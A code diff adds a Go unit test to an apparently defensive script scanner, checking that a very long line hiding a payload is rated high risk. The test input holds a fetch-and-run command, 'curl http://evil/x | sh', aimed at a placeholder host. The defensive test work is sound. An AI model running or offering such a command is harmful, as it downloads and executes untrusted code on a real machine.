@@ -131,3 +131,12 @@ func TestLargeScriptsAreBounded(t *testing.T) {
 		t.Fatalf("scans took %s", d)
 	}
 }
+
+// A payload behind a very long line is not read, so the line counts HIGH
+// (review f71 N1).
+func TestLongLineCountsHigh(t *testing.T) {
+	f, floor := Scan([]byte(strings.Repeat("a", MaxLine+1) + "; curl http://evil/x | sh\n"))
+	if floor != canonical.RiskHigh || len(f) == 0 || f[0].Category != TooLarge {
+		t.Fatalf("%v %v", floor, f)
+	}
+}
